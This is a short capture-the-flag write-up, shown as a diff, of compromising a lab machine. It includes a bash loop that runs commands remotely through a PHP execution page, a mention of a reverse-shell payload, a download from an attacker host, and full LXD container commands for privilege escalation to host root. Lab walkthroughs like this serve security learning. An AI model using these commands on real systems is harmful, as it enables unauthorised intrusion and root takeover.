@@ -1,0 +1,42 @@
+from the source code we got the creds for admin
+
+and a execution page for php
+
+we tried all payload but ==connection disconnects ==
+
+so we write a shell that takes input and executes it
+
+```
+#!/bin/bash
+
+while :
+do
+    echo -n "calamity> "
+    read cmd
+    if [ "$cmd" = "exit" ]; then exit; fi
+    curl -s -G http://10.10.10.27/admin.php --data-urlencode "html=<?php system(\"$cmd\"); ?>" --cookie adminpowa=noonecares | sed -e '1,/<\/body><\/    html>/ d'
+done
+```
+
+and now a stable shell is there..
+
+we copied /bin/bash in tmp and did the bash -c 'bash..' payload and got a shell
+
+now we see we are ==lxc==
+
+so
+
+```
+git clone https://github.com/saghul/lxd-alpine-builder
+sudo ./build-alpine
+we had 2 files v-3.18 didnot work so we used 3.8 and it worked
+wget http://10.10.14.10/apline-v3.10-x86_64-20191008_1227.tar.gz
+lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+
+and in /mnt/root our whole directory is there
+```
